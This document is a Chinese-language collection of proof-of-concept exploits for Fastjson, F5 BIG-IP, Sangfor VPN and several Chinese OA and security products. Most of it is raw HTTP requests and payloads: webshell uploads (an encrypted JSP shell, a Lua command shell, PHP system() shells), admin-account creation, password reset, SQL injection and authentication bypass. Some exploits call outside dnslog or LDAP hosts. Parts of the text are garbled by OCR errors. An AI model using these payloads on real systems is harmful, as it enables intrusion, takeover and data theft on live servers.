## Fastjson代码执行漏洞(CVE-2022-25845)

### 0x00 漏洞信息

Fastjson是阿里巴巴的开源JSON解析库，可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到Java Bean。Fastjson接口简单易用，已经被广泛使用在缓存序列化、协议交互、Web输出、Android客户端等多种应用场景。

在默认配置下，当应用或系统用Fastjson对由用户可控的JSON字符串进行解析时，将可能导致远程代码执行的危害。攻击者利用该漏洞可实现在目标机器上的远程代码执行。

**漏洞等级** 严重



### 0x01 影响范围

**Fastjson ≤ 1.2.80**



### 0x02 poc

```
{
  "@type": "java.lang. Exception",
  "@type": "com.github.isafeblue.fastjson. SimpleException",
  "domain": "calc"
}
```



数据包

```
POST /addComment HTTP/1.1
Host: 10.211.55.7:8099
Accept:" /*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=O.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Length: 40
Content-Type: application/json; charset=utf-8
Cookie: LOGIN_LANG=cn
Origin: http://10.211.55.7:8099
Referer: http:.//10.211.55.7:8099/
User-Agent: Mozilla/5.0 (Macintosh; Intell Mac OS ×10.15; rv:102.0)Gecko/20100101Firefox/102.0
x-Requested-With: XMLHttpRequest

｛
    "@type" : "jiava.lang.Exception",
    "@type": "com.github.isafeblue.fastjson.SimpleException",
    "domain": "calc"
｝
```



参考链接：

https://www.iculture.cc/cybersecurity/pig=20793



## 天融信上网行为管理系统 一句话木马



```
/view/IPV6/naborTable/static_convert.php?blocks[0]=||%20
echo%20%27%3C?php%20phpinfo();?%3E%27%20%3E%3E%20/var/www/html/1.php%0a
```



## 深信服VPN任意用户添加漏洞

**漏洞等级** 严重

### 0x02 poc

```
POST /cgi-bin/php-cgi/html/delegatemodule/HttpHandler.php?controler=User&action=AddUser&token=e52021a4c9c962ac9cc647effddcf57242d152d9 HTTP/1.1
Host: xxxxxx
Cookie: language=zh_CN; sinfor_session_id=W730120C88755A7D932019B349CCAC63; PHPSESSID=cb12753556d734509d4092baabfb55dd; x-anti-csrf-gcs=A7DBB1DC0050737E; usermrgstate=%7B%22params%22%3A%7B%22grpid%22%3A%22-1%22%2C%22recflag%22%3A0%2C%22filter%22%3A0%7D%2C%22pageparams%22%3A%7B%22start%22%3A0%2C%22limit%22%3A25%7D%2C%22otherparams%22%3A%7B%22searchtype%22%3A0%2C%22recflag%22%3Afalse%7D%7D; hidecfg=%7B%22name%22%3Afalse%2C%22flag%22%3Afalse%2C%22note%22%3Afalse%2C%22expire%22%3Atrue%2C%22lastlogin_time%22%3Atrue%2C%22phone%22%3Atrue%2C%22allocateip%22%3Atrue%2C%22other%22%3Afalse%2C%22state%22%3Afalse%7D
Content-Length: 707
Sec-Ch-Ua: "Chromium";v="103", ".Not/A)Brand";v="99"
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
Sec-Ch-Ua-Platform: "macOS"
Accept: */*
Origin: https://xxxxxx
X-Forwarded-For: 127.0.0.1
X-Originating-Ip: 127.0.0.1
X-Remote-Ip: 127.0.0.1
X-Remote-Addr: 127.0.0.1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://xxxxxx/html/tpl/userMgt.html?userid=0&groupid=-1&createRole=1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close


name=admin1&note=admin1&passwd=Admin%40123&passwd2=Admin%40123&phone=&grpid=-1&grptext=%2F%E9%BB%98%E8%AE%A4%E7%94%A8%E6%88%B7%E7%BB%84&selectAll=1&b_inherit_auth=1&b_inherit_grpolicy=1&is_Autoip=1&allocateip=0.0.0.0&gqsj=1&ex_time=2027-07-29&is_enable=1&is_public=1&is_pwd=1&first_psw_type=-1&second_server=&auth_type=0&ext_auth_id=&token_svr_id=%E8%AF%B7%E9%80%89%E6%8B%A9&grpolicy_id=0&grpolicytext=%E9%BB%98%E8%AE%A4%E7%AD%96%E7%95%A5%E7%BB%84&roleid=&roletext=&year=&month=&day=&isBindKey=&userid=0&crypto_key=&szcername=&caid=-1&certOpt=0&create_time=&sec_key=&first_psw_name=%E6%9C%AC%E5%9C%B0%E6%95%B0%E6%8D%AE%E5%BA%93&first_psw_id=&second_psw_name=&second_psw_id=&is_extauth=0&secondAuthArr=%5B%5D
```





## 安恒数据大脑 API 网关任意密码重置漏洞

**漏洞等级** 严重



### 0x02 poc

```
POST /q/common-permission/public/users/forgetPassword HTTP/1.1 
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0 
Accept-Language: en-US,en;q=0.5 
Content-type: application/json 
Accept-Encoding: gzip, deflate 
Connection: close 
Upgrade-Insecure-Requests: 1 
Content-Length: 104 


{"code":XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX,"rememberMe":false,"use rname":"admin","password":"XXXXXXXXXXXXXXXXXXXXXXXXXX"}
```



## 360 天擎任意文件上传

**漏洞等级**：严重

漏洞详情：/api/client_upload_file.json 存在任意文件上传漏洞

```
POST /api/client_upload_file.json?mid=12345678901234567890123456789012&md5=123456 78901234567890123456789012&filename=../../lua/123.LUAC HTTP/1.1 
Host: xxxxx 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 
Content-Length: 323 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLx7ATxHThfk91ox Q 
Referer: xxxxx Accept-Encoding: gzip 


------WebKitFormBoundaryLx7ATxHThfk91oxQ 
Content-Disposition: form-data; name="file"; filename="flash.php" Content-Type: application/xxxx if ngx.req.get_uri_args().cmd then cmd = ngx.req.get_uri_args().cmd local t = io.popen(cmd) local a = t:read("*all") ngx.say(a) 
end------WebKitFormBoundaryLx7ATxHThfk91oxQ--
```





## 万户 OA 文件上传漏洞

**漏洞等级**：严重

漏洞详情：/defaultroot/officeserverservlet 路径存在文件上传漏洞



### 0x02 poc

```
POST /defaultroot/officeserverservlet HTTP/1.1 
Host: XXXXXXXXX:7001 
Content-Length: 782 
Cache-Control: max-age=0 
Upgrade-Insecure-Requests: 1 
Origin: http://XXXXXXXX7001 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, li ke Gecko) Chrome/89.0.4389.114 Safari/537.36 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,imag e/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 
Accept-Language: zh-CN,zh;q=0.9 
Cookie: OASESSIONID=CC676F4D1C584324CEFE311E71F2EA08; LocLan=zh_CN 
Connection: close 
DBSTEP V3.0 170 0 1000 DBSTEP=REJTVE 
VQ 
OPTION=U0FWRUZJTEU= 
RECORDID= 
isDoc=dHJ1ZQ== 
moduleType=Z292ZG9jdW1lbnQ= 
FILETYPE=Li4vLi4vdXBncmFkZS82LmpzcA== 
111111111111111111111111111111111111111 
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends Class Loader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.le ngth);}}%><%if (request.getMethod().equals("POST")){String k="892368804b205b83";/*man ba*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec (k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE6 4Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContex t);}%>
```

DBSTEP V3.0 170 0 1000

170 是控制从报文中什么地方读取

1000 是控制 webshell 源代码内容大小



## 泛微OA 管理员任意登录

漏洞等级：严重

泛微OA 任意管理员登录漏洞



漏洞poc

url：

```
/mobile/plugin/VerifyQuickLogin.jsp
```

payload：

```
identifier=1&language=1&ipaddress=
```





## 泛微 OA 文件上传

漏洞等级：严重

漏洞详情：/workrelate/plan/util/uploaderOperate.jsp 存在文件上传漏洞

```
POST /workrelate/plan/util/uploaderOperate.jsp HTTP/1.1 
Host: X.X.X.X 
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101" 
Sec-Ch-Ua-Mobile: ?0 
Sec-Ch-Ua-Platform: "macOS" 
Upgrade-Insecure-Requests: 1 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/ *;q=0.8,application/signed-exchange;v=b3;q=0.9 
Sec-Fetch-Site: none 
Sec-Fetch-Mode: navigate 
Sec-Fetch-User: ?1 
Sec-Fetch-Dest: document 
Accept-Encoding: gzip, deflate 
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 
Connection: close 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymVk33liI64J7GQaK 
Content-Length: 393 
------WebKitFormBoundarymVk33liI64J7GQaK 
Content-Disposition: form-data; name="secId" 
1 
------WebKitFormBoundarymVk33liI64J7GQaK 
Content-Disposition: form-data; name="Filedata"; filename="testlog.txt" 
Test 
------WebKitFormBoundarymVk33liI64J7GQaK Content-Disposition: form-data; name="plandetailid" 
1 
------WebKitFormBoundarymVk33liI64J7GQaK—
```

将文件释放至跟网站根路径下 在数据包中将 fileid 替换

![图片[8]-2022护网第五天 含IP情报、漏洞、趣事-FancyPig's blog](hw2022poc%E6%A2%B3%E7%90%86.assets/20220729183721747.png)





## 泛微 eoffice10 前台 getshell

漏洞等级：严重

漏洞详情：版本号：http://XXXXXXX:8010/eoffice10/version.json

```
<form method='post' action='http://XXXXXXXX:8010/eoffice10/server/public/iWebOffice2015/OfficeServer.php' enctype="multipart/form-data" > <input type="file" name="FileData"/></br></br> <input type="text" name="FormData" value="1"/></br></br> <button type=submit value="上传">上传</button> </form>
```



```
POST /eoffice10/server/public/iWebOffice2015/OfficeServer.php HTTP/1.1 
Host: XXXXXXXX:8010 
Content-Length: 378 
Cache-Control: max-age=0 
Upgrade-Insecure-Requests: 1 
Origin: null 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJjb5ZAJOOXO7fwjs 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/ *;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7 
Connection: close 
------WebKitFormBoundaryJjb5ZAJOOXO7fwjs 
Content-Disposition: form-data; name="FileData"; filename="1.jpg" Content-Type: image/jpeg <?php echo md5(1);?> 
------WebKitFormBoundaryJjb5ZAJOOXO7fwjs Content-Disposition: form-data; name="FormData" {'USERNAME':'','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'test.php'} ------WebKitFormBoundaryJjb5ZAJOOXO7fwjs--
```





## 蓝凌OA授权RCE和未授权RCE

#### Fofa搜索资产

```
app="Landray-OA系统"
```

#### URL

其中xxxx.dnslog.cn为你dns回连的地址

```
/data/sys-common/datajson.js?s_bean=sysFormulaSimulateByJS&script=function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec("ping -c 4 xxxx.dnslog.cn")&type=1
```

poc：

https://github.com/SakuraHack-Y/Landray-oa-rce



## H3C CAS云计算平台分布式存储管理系统任意用户密码读取

```
/user/user/1
```





## 用友时空KSOA软件前台文件上传漏洞

漏洞等级：高危

```
POST /servlet/com.sksoft.bill.ImageUpload?filepath=/&filename=gmtxj.jsp HTTP/1.0
Host:xox.com
content-Length:247
Accept-Encoding:identity
Accept-Language:zh-CN,zh;q=0.8 Accept:*/*
User-Agent:Mozlla/5.0 (Windows NT 5.1; rv.5.0) Gecko/20100101 Firetox15.0 Zerolab-P/v3.2 Accept-Charset:GBK,utf-8;q=0.7,*;q=0.3 Zerolab-Scan;Zerolab-PN3.2
Referer:http:lwww.baidu.com
cache-controL:max-age=0x-varnlish:196324196

<%
out.printin(new String(new sun.misc.BASE64Decoder().decodeBuffer("ZTE2NTQyMTExMGJhMDMwOTIhMWIMwMzKZMzCZYZViNDM="); new java.io.File(application.getReallPath(request getServletPathOl).delete();
%>
```



参考链接：

https://planet.vulbox.com/detail/MTA2OTA=的评论区



## 禅道v16.5 SQL注入

**漏洞描述**：

漏洞编号 CNVD-2022-42853

**影响产品**

禅道企业版 6.5

禅道旗舰版 3.0

禅道开源版 16.5

禅道开源版 16.5.beta1



漏洞poc

下载地址： https://github.com/west9b/ZentaoSqli 

url：

/zentao/user-login.html

payload：

```
account=admin%27+and+%28select+extractvalue%281%2Cconcat%280x7e%2C%28
```









## 【无poc】红帆医疗云OA医用版 SQL注入

漏洞等级：中危

漏洞详细：红帆医疗云OA医用版存在前台SQL注入漏洞

漏洞危害：攻击者可以在易受攻击的系统上执行任意 SQL 语句。根据正在使用的后端数据库， SQL 注入漏洞会导致攻击者访问不同级别的数据/系统。在某些情况下，可以读入或写出文件，或者在底层操作系统上执行 shell 命令。



```
/api/switch-value/list?sorts=%5B%7B%22Field%22:%22convert(int,stuff((select%20quotename(name)%20from%20sys.databases%20for%20xml%20path(%27%27),1,0,%27%27))%22%7D%5D&conditions=%5B%5D&_ZQA_ID=4dc296c5c89905a7)
```

参考链接：

https://www.iculture.cc/cybersecurity/pig=21358

修复建议：

加waf，尽快更新系统框架



## CVE-2022-1388（F5 BIG-IP Remote Code Execution）

```
# F5 BIG-IP RCE exploitation (CVE-2022-1388)

POST (1): 

POST /mgmt/tm/util/bash HTTP/1.1
Host: <redacted>:8443
Authorization: Basic YWRtaW46
Connection: keep-alive, X-F5-Auth-Token
X-F5-Auth-Token: 0

{"command": "run" , "utilCmdArgs": " -c 'id' " }

curl commandliner: 

$ curl -i -s -k -X $'POST'
-H $'Host: <redacted>:8443' 
-H $'Authorization: Basic YWRtaW46' 
-H $'Connection: keep-alive, X-F5-Auth-Token' 
-H $'X-F5-Auth-Token: 0' 
-H $'Content-Length: 52' 
--data-binary $'{\"command\": \"run\" , \"utilCmdArgs\": \" -c \'id\' \" }\x0d\x0a'
$'https://<redacted>:8443/mgmt/tm/util/bash' --proxy http://127.0.0.1:8080


POST (2):

POST /mgmt/tm/util/bash HTTP/1.1
Host: <redateced>:8443
Authorization: Basic YWRtaW46
Connection: keep-alive, X-F5-Auth-Token
X-F5-Auth-Token: 0

{"command": "run" , "utilCmdArgs": " -c ' cat /etc/passwd' " }

curl commandliner:

$ curl -i -s -k -X $'POST'
-H $'Host: <redacted>:8443' 
-H $'Authorization: Basic YWRtaW46' -H $'Connection: keep-alive, X-F5-Auth-Token' 
-H $'X-F5-Auth-Token: 0'
--data-binary $'{\"command\": \"run\" , \"utilCmdArgs\": \" -c \' cat /etc/passwd\' \" }\x0d\x0a\x0d\x0a'
$'https://<redacted>/mgmt/tm/util/bash' --proxy http://127.0.0.1:8080

Note: 

Issue could be related between frontend and backend authentication "Jetty" with empty credentials "admin: <empty>" 
+ value of headers ,see "HTTP hop_by_hop request headers"...

References and Fixes :
* https://support.f5.com/csp/article/K23605346
* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1388

Here the documentation used latest nites:
* https://clouddocs.f5.com/api/icontrol-rest/ 

HTTP hop_by_hop request headers: 
* https://portswigger.net/research/top-10-web-hacking-techniques-of-2019-nominations-open

# Author
Alex Hernandez aka @_alt3kx_
```





## Roxy-WI 未经身份验证的远程代码执行

参考来源[《Advisory | Roxy-WI Unauthenticated Remote Code Executions CVE-2022-31137》](https://www.iculture.cc/?golink=aHR0cHM6Ly9wZW50ZXN0LmJsb2cvYWR2aXNvcnktcm94eS13aS11bmF1dGhlbnRpY2F0ZWQtcmVtb3RlLWNvZGUtZXhlY3V0aW9ucy1jdmUtMjAyMi0zMTEzNy8=)

```
POST /app/options.py HTTP/1.1
Host: 192.168.56.116
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 105
Origin: https://192.168.56.114
Dnt: 1
Referer: https://192.168.56.114/app/login.py
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

alert_consumer=notNull&serv=roxy-wi.access.log&rows1=10&grep=&exgrep=&hour=00&minut=00&hour1=23&minut1=45
```





## 海康威视综合运营管理平台RCE漏洞

```
POST /bic/ssoService/v1/applyCT HTTP/1.1
Host: xxx
User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 188

{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xxx.dnstunnel.run","autoCommit":true}}
```



## 泛微E-office do_excel.php任意文件写入漏洞

```
/WWW/general/charge/charge_list/do_excel.php
```

payload

```
html=<?php system($_POST[pass]);?>
```



## 通达OA登录认证绕过

未经授权的攻击者可以通过精心构造的HTTP请求登录任意用户，包括Admin用户

```
POST /module/retrieve_pwd/header.inc.php HTTP/1.1
Host: hostname
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Connection: close
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
Content-Length: 1830


_SESSION%5BLOGIN_THEME%5D=15&_SESSION%5BLOGIN_USER_ID%5D=1&_SESSION%5BLOGIN_UID%5D=1&_SESSION%5BLOGIN_FUNC_STR%5D=1%2C3%2C42%2C643%2C644%2C634%2C4%2C147%2C148%2C7%2C8%2C9%2C10%2C16%2C11%2C130%2C5%2C131%2C132%2C256%2C229%2C182%2C183%2C194%2C637%2C134%2C37%2C135%2C136%2C226%2C253%2C254%2C255%2C536%2C24%2C196%2C105%2C119%2C80%2C96%2C97%2C98%2C114%2C126%2C179%2C607%2C539%2C251%2C127%2C238%2C128%2C85%2C86%2C87%2C88%2C89%2C137%2C138%2C222%2C90%2C91%2C92%2C152%2C93%2C94%2C95%2C118%2C237%2C108%2C109%2C110%2C112%2C51%2C53%2C54%2C153%2C217%2C150%2C239%2C240%2C218%2C219%2C43%2C17%2C18%2C19%2C15%2C36%2C70%2C76%2C77%2C115%2C116%2C185%2C235%2C535%2C59%2C133%2C64%2C257%2C2%2C74%2C12%2C68%2C66%2C67%2C13%2C14%2C40%2C41%2C44%2C75%2C27%2C60%2C61%2C481%2C482%2C483%2C484%2C485%2C486%2C487%2C488%2C489%2C490%2C491%2C492%2C120%2C494%2C495%2C496%2C497%2C498%2C499%2C500%2C501%2C502%2C503%2C505%2C504%2C26%2C506%2C507%2C508%2C515%2C537%2C122%2C123%2C124%2C628%2C125%2C630%2C631%2C632%2C633%2C55%2C514%2C509%2C29%2C28%2C129%2C510%2C511%2C224%2C39%2C512%2C513%2C252%2C230%2C231%2C232%2C629%2C233%2C234%2C461%2C462%2C463%2C464%2C465%2C466%2C467%2C468%2C469%2C470%2C471%2C472%2C473%2C474%2C475%2C200%2C202%2C201%2C203%2C204%2C205%2C206%2C207%2C208%2C209%2C65%2C187%2C186%2C188%2C189%2C190%2C191%2C606%2C192%2C193%2C221%2C550%2C551%2C73%2C62%2C63%2C34%2C532%2C548%2C640%2C641%2C642%2C549%2C601%2C600%2C602%2C603%2C604%2C46%2C21%2C22%2C227%2C56%2C30%2C31%2C33%2C32%2C605%2C57%2C609%2C103%2C146%2C107%2C197%2C228%2C58%2C538%2C151%2C6%2C534%2C69%2C71%2C72%2C223%2C639%2C225%2C236%2C78%2C178%2C104%2C121%2C149%2C84%2C99%2C100%2C533%2C101%2C113%2C198%2C540%2C626%2C638%2C38%2C&_SESSION%5BLOGIN_USER_PRIV%5D=1&_SESSION%5BLOGIN_USER_PRIV_OTHER%5D=1&_SESSION%5BLOGIN_USER_PRIV_TYPE%5D=1&_SESSION%5BLOGIN_NOT_VIEW_USER%5D=0&_SESSION%5BRETRIEVE_PWD_USER%5D=2s
```





## 参考链接

https://www.iculture.cc/cybersecurity/pig=21144

https://www.iculture.cc/cybersecurity/pig=21096

https://mp.weixin.qq.com/s/IeRLgt5kCKbythKXebrjiA

